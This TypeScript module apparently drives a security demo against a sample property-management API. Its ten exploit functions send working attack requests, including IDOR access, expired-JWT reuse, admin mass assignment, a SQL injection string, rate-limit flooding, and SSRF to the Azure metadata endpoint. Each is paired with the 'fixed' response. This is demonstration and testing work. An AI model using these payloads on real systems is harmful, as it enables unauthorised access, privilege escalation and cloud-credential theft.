import axios from 'axios';
import { getToken, makeExpiredJwt } from './auth';

export interface ExploitResult {
  vulnerable: boolean;
  details: string;
  request: string;
  response: string;
  fixedResponse: string;
}

function tok(t: string) {
  return t ? t.substring(0, 24) + '…' + t.slice(-8) : '<token>';
}

// VULN-1: BOLA — Bob accesses Alice's job
export async function exploitBOLA(): Promise<ExploitResult> {
  const token = await getToken('bob');
  const jobId = 'cccccccc-0000-0000-0000-000000000001';
  const reqStr = `GET /api/jobs/${jobId}\nAuthorization: Bearer ${tok(token)}\n// Bob's token — he owns different properties`;
  try {
    const r = await axios.get(`/api/jobs/${jobId}`, { headers: { Authorization: `Bearer ${token}` } });
    const d = r.data.data ?? {};
    const details = `Bob (bob@propowner.com) accessed Alice's job and got HTTP 200.\n` +
      `  Job Title   : ${d.title ?? 'N/A'}\n` +
      `  Description : ${d.description ?? 'N/A'}\n` +
      `  Job Status  : ${d.status ?? 'N/A'}\n` +
      `  Owner ID    : ${d.owner_id ?? 'N/A'}\n` +
      `  Property ID : ${d.property_id ?? 'N/A'}`;
    return {
      vulnerable: true,
      details,
      request: reqStr,
      response: `HTTP 200 OK\n${JSON.stringify(r.data, null, 2).substring(0, 400)}`,
      fixedResponse: `HTTP 403 Forbidden\n{\n  "error": "Access denied: you do not own this resource"\n}\n// Bob's request blocked — owner_id check enforced`,
    };
  } catch (e: any) {
    return {
      vulnerable: false,
      details: `Protected: ${e.response?.status} ${e.response?.data?.error}`,
      request: reqStr,
      response: `HTTP ${e.response?.status}\n${JSON.stringify(e.response?.data)}`,
      fixedResponse: `HTTP 403 Forbidden\n{\n  "error": "Access denied: you do not own this resource"\n}`,
    };
  }
}

// VULN-2: Broken Auth — expired JWT accepted
export async function exploitBrokenAuth(): Promise<ExploitResult> {
  const expiredToken = makeExpiredJwt();
  const reqStr = `GET /api/jobs\nAuthorization: Bearer ${tok(expiredToken)}\n(exp: ${new Date(Date.now() - 3600000).toISOString()})`;
  try {
    const r = await axios.get('/api/jobs', { headers: { Authorization: `Bearer ${expiredToken}` } });
    return {
      vulnerable: true,
      details: `Server accepted an EXPIRED JWT and returned HTTP 200 with ${r.data.data?.length} jobs!`,
      request: reqStr,
      response: `HTTP 200 OK\n${JSON.stringify(r.data).substring(0, 200)}`,
      fixedResponse: `HTTP 401 Unauthorized\n{\n  "error": "Token has expired"\n}`,
    };
  } catch (e: any) {
    return {
      vulnerable: false,
      details: `Protected: Expired token rejected with ${e.response?.status}`,
      request: reqStr,
      response: `HTTP ${e.response?.status}\n${JSON.stringify(e.response?.data)}`,
      fixedResponse: `HTTP 401 Unauthorized\n{\n  "error": "Token has expired"\n}`,
    };
  }
}

// VULN-3: Mass Assignment — contractor sets own role to admin
export async function exploitMassAssignment(): Promise<ExploitResult> {
  const token = await getToken('charlie');
  const contractorId = 'bbbbbbbb-0000-0000-0000-000000000001';
  const payload = { specialty: 'plumbing', hourlyRate: 95, role: 'admin', isVerified: true };
  const reqStr = `PUT /api/contractors/${contractorId}\nAuthorization: Bearer ${tok(token)}\n\n${JSON.stringify(payload, null, 2)}`;
  try {
    const r = await axios.put(`/api/contractors/${contractorId}`, payload, { headers: { Authorization: `Bearer ${token}` } });
    const d = r.data.data;
    const vuln = d?.role === 'admin' || d?.is_verified === true || d?.isVerified === true;
    if (vuln) {
      return {
        vulnerable: true,
        details: `Contractor self-assigned role="${d?.role}", isVerified=${d?.is_verified ?? d?.isVerified}`,
        request: reqStr,
        response: `HTTP 200 OK\n${JSON.stringify(r.data, null, 2)}`,
        fixedResponse: `HTTP 200 OK\n{\n  "data": { "role": "contractor", "isVerified": false, "specialty": "plumbing", "hourlyRate": 95 }\n}\n// role and isVerified fields ignored`,
      };
    }
    return {
      vulnerable: false,
      details: `Protected — role/isVerified fields were ignored`,
      request: reqStr,
      response: JSON.stringify(r.data).substring(0, 300),
      fixedResponse: `HTTP 200 OK\n{\n  "data": { "role": "contractor", "isVerified": false }\n}`,
    };
  } catch (e: any) {
    return {
      vulnerable: false,
      details: `Protected: ${e.response?.status}`,
      request: reqStr,
      response: `HTTP ${e.response?.status}`,
      fixedResponse: `HTTP 200 OK\n{\n  "data": { "role": "contractor", "isVerified": false }\n}`,
    };
  }
}

// VULN-4: Large Payload DoS — send large JSON body
export async function exploitLargePayload(): Promise<ExploitResult> {
  const token = await getToken('alice');
  const bigPayload = { title: 'A'.repeat(1_000_000) };
  const reqStr = `POST /api/jobs\nAuthorization: Bearer ${tok(token)}\nContent-Length: ~1MB\n\n{ "title": "AAAA..." (1,000,000 chars) }`;
  try {
    const r = await axios.post('/api/jobs', bigPayload, { headers: { Authorization: `Bearer ${token}` } });
    return {
      vulnerable: true,
      details: `Server accepted a ~1MB JSON payload (HTTP ${r.status}). No body size limit enforced.`,
      request: reqStr,
      response: `HTTP ${r.status}`,
      fixedResponse: `HTTP 413 Payload Too Large\n{\n  "error": "Request body too large (max 1MB)"\n}`,
    };
  } catch (e: any) {
    if (e.response?.status === 413) {
      return {
        vulnerable: false,
        details: `Protected: Server returned 413 Payload Too Large`,
        request: reqStr,
        response: `HTTP 413 Payload Too Large`,
        fixedResponse: `HTTP 413 Payload Too Large\n{\n  "error": "Request body too large (max 1MB)"\n}`,
      };
    }
    return {
      vulnerable: true,
      details: `Server did not return 413 — returned ${e.response?.status || 'no response'}. No size cap detected.`,
      request: reqStr,
      response: `HTTP ${e.response?.status || 'timeout'}`,
      fixedResponse: `HTTP 413 Payload Too Large\n{\n  "error": "Request body too large (max 1MB)"\n}`,
    };
  }
}

// VULN-5: Pagination Abuse — request 99999 records
export async function exploitPaginationAbuse(): Promise<ExploitResult> {
  const token = await getToken('alice');
  try {
    const normalR = await axios.get('/api/properties?limit=5&page=1', { headers: { Authorization: `Bearer ${token}` } });
    const normalCount = normalR.data.count ?? normalR.data.data?.length ?? 0;
    const abusiveR = await axios.get('/api/properties?limit=99999&page=1', { headers: { Authorization: `Bearer ${token}` } });
    const abusiveCount = abusiveR.data.count ?? abusiveR.data.data?.length ?? 0;
    const vuln = abusiveCount > 100 || abusiveCount === abusiveR.data.data?.length;
    return {
      vulnerable: vuln,
      details: vuln
        ? `Normal query (limit=5) → ${normalCount} records. Abuse query (limit=99999) → ${abusiveCount} records. No cap enforced!`
        : `Protected: limit=99999 returned only ${abusiveCount} records (cap enforced)`,
      request: `GET /api/properties?limit=99999&page=1\nAuthorization: Bearer ${tok(token)}`,
      response: `HTTP 200 OK — returned ${abusiveCount} records`,
      fixedResponse: `HTTP 200 OK — returned 20 records\n// limit capped at max=100 server-side`,
    };
  } catch (e: any) {
    return {
      vulnerable: false,
      details: `Error: ${e.message}`,
      request: `GET /api/properties?limit=99999\nAuthorization: Bearer ${tok(token)}`,
      response: `${e.response?.status}`,
      fixedResponse: `HTTP 200 OK — returned 20 records (cap enforced)`,
    };
  }
}

// VULN-6: Rate Limit — 15 rapid bid requests, expect 429
export async function exploitRateLimit(): Promise<ExploitResult> {
  const token = await getToken('charlie');
  const jobId = 'cccccccc-0000-0000-0000-000000000001';
  let successCount = 0, throttledCount = 0;
  await Promise.all(
    Array.from({ length: 15 }, (_, i) =>
      axios.post(`/api/jobs/${jobId}/bids`, { amount: 100 + i, note: `Bid ${i}` }, { headers: { Authorization: `Bearer ${token}` } })
        .then(() => successCount++)
        .catch(e => { if (e.response?.status === 429) throttledCount++; else successCount++; })
    )
  );
  const vuln = throttledCount === 0;
  return {
    vulnerable: vuln,
    details: vuln
      ? `Sent 15 rapid bids — ${successCount} accepted, 0 throttled. No rate limiting!`
      : `Protected: ${throttledCount}/15 requests returned HTTP 429`,
    request: `15× POST /api/jobs/${jobId}/bids\nAuthorization: Bearer ${tok(token)}\n(same user, rapid-fire)`,
    response: `${successCount} × HTTP 200/201, ${throttledCount} × HTTP 429`,
    fixedResponse: `10 × HTTP 201 Created\n5 × HTTP 429 Too Many Requests\n{\n  "error": "Rate limit: 10 req/min per user"\n}`,
  };
}

// VULN-7: CORS — check wildcard origin header
export async function exploitCORS(): Promise<ExploitResult> {
  try {
    const r = await fetch('http://localhost:3001/api/properties', {
      method: 'OPTIONS',
      headers: {
        'Origin': 'https://evil-site.com',
        'Access-Control-Request-Method': 'GET',
      },
    });
    const acao = r.headers.get('Access-Control-Allow-Origin') ?? '';
    const acac = r.headers.get('Access-Control-Allow-Credentials') ?? '';
    const vuln = acao === '*' || acao.includes('evil-site');
    return {
      vulnerable: vuln,
      details: vuln
        ? `Access-Control-Allow-Origin: ${acao} — wildcard with credentials: ${acac}. Any website can make credentialed requests!`
        : `Protected: ACAO header is "${acao}" (not wildcard)`,
      request: `OPTIONS /api/properties\nOrigin: https://evil-site.com\nAccess-Control-Request-Method: GET`,
      response: `Access-Control-Allow-Origin: ${acao}\nAccess-Control-Allow-Credentials: ${acac}`,
      fixedResponse: `Access-Control-Allow-Origin: https://proptracker.yourdomain.com\nAccess-Control-Allow-Credentials: true\n// evil-site.com origin blocked`,
    };
  } catch (e: any) {
    return {
      vulnerable: false,
      details: `Could not check: ${e.message}`,
      request: 'OPTIONS /api/properties\nOrigin: https://evil-site.com',
      response: 'N/A',
      fixedResponse: `Access-Control-Allow-Origin: https://proptracker.yourdomain.com`,
    };
  }
}

// VULN-8: SQL Injection
export async function exploitSQLInjection(): Promise<ExploitResult> {
  const token = await getToken('alice');
  try {
    const normalR = await axios.get('/api/properties/search?q=Tower', { headers: { Authorization: `Bearer ${token}` } });
    const normalCount = normalR.data.data?.length ?? 0;
    const injR = await axios.get(`/api/properties/search?q=${encodeURIComponent("' OR 1=1 --")}`, { headers: { Authorization: `Bearer ${token}` } });
    const injCount = injR.data.data?.length ?? 0;
    const vuln = injCount > normalCount && injCount >= 3;
    return {
      vulnerable: vuln,
      details: vuln
        ? `Normal search ("Tower") → ${normalCount} results. SQL injection ("' OR 1=1 --") → ${injCount} results. Entire table returned!`
        : `Protected: Injection returned ${injCount} results (same as baseline ${normalCount})`,
      request: `GET /api/properties/search?q=' OR 1=1 --\nAuthorization: Bearer ${tok(token)}`,
      response: `HTTP 200 OK — ${injCount} properties returned`,
      fixedResponse: `HTTP 200 OK — ${normalCount} properties returned\n// parameterized query neutralized injection`,
    };
  } catch (e: any) {
    return {
      vulnerable: false,
      details: `Error: ${e.message}`,
      request: `GET /api/properties/search?q=' OR 1=1 --\nAuthorization: Bearer ${tok(token)}`,
      response: `${e.response?.status}`,
      fixedResponse: `HTTP 200 OK — 0 results\n// parameterized query: WHERE name ILIKE $1`,
    };
  }
}

// VULN-9: Business Flow — Charlie completes Diana's job
export async function exploitBusinessFlow(): Promise<ExploitResult> {
  const token = await getToken('charlie');
  const jobId = 'cccccccc-0000-0000-0000-000000000002'; // Diana's job
  const reqStr = `POST /api/jobs/${jobId}/complete\nAuthorization: Bearer ${tok(token)}\n// Charlie is NOT the assigned contractor`;
  try {
    const r = await axios.post(`/api/jobs/${jobId}/complete`, {}, { headers: { Authorization: `Bearer ${token}` } });
    return {
      vulnerable: true,
      details: `Charlie completed Diana's job (HTTP ${r.status})! No check that Charlie is the assigned contractor.`,
      request: reqStr,
      response: `HTTP ${r.status} OK\n${JSON.stringify(r.data).substring(0, 200)}`,
      fixedResponse: `HTTP 403 Forbidden\n{\n  "error": "Only the assigned contractor can complete this job"\n}`,
    };
  } catch (e: any) {
    return {
      vulnerable: false,
      details: `Protected: ${e.response?.status} — ${e.response?.data?.error}`,
      request: reqStr,
      response: `HTTP ${e.response?.status}\n${JSON.stringify(e.response?.data)}`,
      fixedResponse: `HTTP 403 Forbidden\n{\n  "error": "Only the assigned contractor can complete this job"\n}`,
    };
  }
}

// VULN-10: SSRF — send internal metadata URL as webhook
export async function exploitSSRF(): Promise<ExploitResult> {
  const token = await getToken('charlie');
  const contractorId = 'bbbbbbbb-0000-0000-0000-000000000001';
  const ssrfUrl = 'http://169.254.169.254/metadata/instance?api-version=2021-02-01';
  const reqStr = `POST /api/contractors/${contractorId}/trigger-webhook\nAuthorization: Bearer ${tok(token)}\n\n{ "webhookUrl": "${ssrfUrl}" }`;
  try {
    const r = await axios.post(
      `/api/contractors/${contractorId}/trigger-webhook`,
      { webhookUrl: ssrfUrl },
      { headers: { Authorization: `Bearer ${token}` } }
    );
    const leaked = JSON.stringify(r.data).includes('compute') || JSON.stringify(r.data).includes('subscriptionId');
    return {
      vulnerable: true,
      details: leaked
        ? `CRITICAL SSRF: Server fetched Azure IMDS and returned cloud metadata! (subscriptionId, resourceGroup leaked)`
        : `Server accepted internal URL and attempted to fetch it (HTTP ${r.status}). In Azure, this would leak cloud metadata.`,
      request: reqStr,
      response: `HTTP ${r.status}\n${JSON.stringify(r.data).substring(0, 300)}`,
      fixedResponse: `HTTP 400 Bad Request\n{\n  "error": "Webhook URL must use HTTPS with an approved host"\n}`,
    };
  } catch (e: any) {
    const status = e.response?.status;
    if (status === 400 || status === 422) {
      return {
        vulnerable: false,
        details: `Protected: Server rejected internal URL with ${status}`,
        request: reqStr,
        response: `HTTP ${status}`,
        fixedResponse: `HTTP 400 Bad Request\n{\n  "error": "Webhook URL must use HTTPS with an approved host"\n}`,
      };
    }
    return {
      vulnerable: true,
      details: `Server attempted to fetch internal URL (got network error, but request was made — in Azure this hits real metadata service)`,
      request: reqStr,
      response: `HTTP ${status ?? 'timeout'} — server made outbound request`,
      fixedResponse: `HTTP 400 Bad Request\n{\n  "error": "Webhook URL must use HTTPS with an approved host"\n}`,
    };
  }
}

export const EXPLOITS = [
  { id: 1,  fn: exploitBOLA },
  { id: 2,  fn: exploitBrokenAuth },
  { id: 3,  fn: exploitMassAssignment },
  { id: 4,  fn: exploitLargePayload },
  { id: 5,  fn: exploitPaginationAbuse },
  { id: 6,  fn: exploitRateLimit },
  { id: 7,  fn: exploitCORS },
  { id: 8,  fn: exploitSQLInjection },
  { id: 9,  fn: exploitBusinessFlow },
  { id: 10, fn: exploitSSRF },
];
